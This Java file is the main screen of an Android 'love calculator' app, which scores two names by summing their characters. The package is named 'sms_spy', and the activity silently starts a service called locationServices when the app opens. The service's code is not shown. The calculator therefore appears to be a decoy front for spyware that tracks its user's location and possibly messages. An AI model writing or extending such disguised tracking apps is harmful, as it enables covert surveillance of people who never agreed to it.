package com.example.moonc.sms_spy;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.os.Vibrator;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    int[] images = {R.drawable.back_11,R.drawable.back_9,R.drawable.back_6,R.drawable.back_7,R.drawable.back_12,R.drawable.back_13};
    RelativeLayout back;
    Handler handler;
    int i = 0;
    ImageButton button;
    EditText editText,editText3;
    String tmp;
    String tmp1;
    ProgressBar progressBar;
    TextView textView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        back = (RelativeLayout)findViewById(R.id.back);
        Intent intent = new Intent(this,locationServices.class);
        startService(intent);
        handler = new Handler();
        button = (ImageButton) findViewById(R.id.button2);
        editText = (EditText)findViewById(R.id.editText);
        editText3 = (EditText)findViewById(R.id.editText3);
        progressBar = (ProgressBar)findViewById(R.id.progressBar);
        textView = (TextView)findViewById(R.id.textView);
        textView.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);

//        editText.setBackgroundColor(Color.WHITE);
//        editText3.setBackgroundColor(Color.WHITE);




        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                while (true) {

                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            back.setBackgroundResource(images[i]);
                        }
                    });

                    if (i == 5)
                        i = 0;
                    else
                        i++;

                    SystemClock.sleep(120000);
                }
            }
        };
        Thread thread = new Thread(runnable);
        thread.start();

    }


    @Override
    public void onBackPressed() {
        super.onBackPressed();
        finishAffinity();
    }

    @Override
    protected void onStart() {
        super.onStart();
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
               // Toast.makeText(getApplicationContext(),"clicked",Toast.LENGTH_SHORT).show();
                String fstName = editText.getText().toString().trim();
                String secName = editText3.getText().toString().trim();

                if(fstName.isEmpty()||secName.isEmpty())
                {
                    if(fstName.isEmpty())
                    {
                        tmp = "Your Name , ";
                    }

                    if(secName.isEmpty())
                    {
                        tmp =  tmp + " Partnets Name";
                    }
                    Vibrator vib = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    vib.vibrate(500);

                    Toast.makeText(getApplicationContext(),"Insert " + tmp + "!!!",Toast.LENGTH_SHORT).show();

                }else {

                    CalculateLove(fstName,secName);
                }
            }
        });

    }

    private void CalculateLove(String fstName, String secName) {

        int length1 = fstName.length();
        int  length2 = secName.length();
        int total_love = 0;
        int love = 0;
        final Handler handler = new Handler();

        for(int i =0;i<length1;i++)
        {
            total_love = total_love + fstName.charAt(i);
        }


        for(int i =0;i<length2;i++)
        {
            total_love = total_love + secName.charAt(i);
        }

        love  = total_love%100;
        final String Love = Integer.toString(love) + "%";

        progressBar.setVisibility(View.VISIBLE);
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                SystemClock.sleep(2000);
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setVisibility(View.GONE);
                        textView.setVisibility(View.VISIBLE);
                        textView.setText(Love);
                    }
                });
            }
        };
        Thread thread = new Thread(runnable);
        thread.start();

    }
}
